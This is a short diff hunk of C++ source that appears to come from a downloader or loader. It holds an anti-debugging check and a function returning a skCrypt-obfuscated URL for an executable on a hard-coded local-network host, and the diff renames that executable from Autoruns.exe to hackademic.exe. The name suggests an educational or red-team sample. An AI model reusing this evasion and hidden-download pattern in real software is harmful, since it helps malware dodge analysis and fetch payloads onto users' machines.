@@ -259,7 +259,7 @@ bool detectDebuggerAll() {
 }
 
 std::wstring getDownloadURL() {
-    auto url = skCrypt(L"http://192.168.100.1:8080/Autoruns.exe");
+    auto url = skCrypt(L"http://192.168.100.1:8080/hackademic.exe");
     return url.decrypt();
 }
 
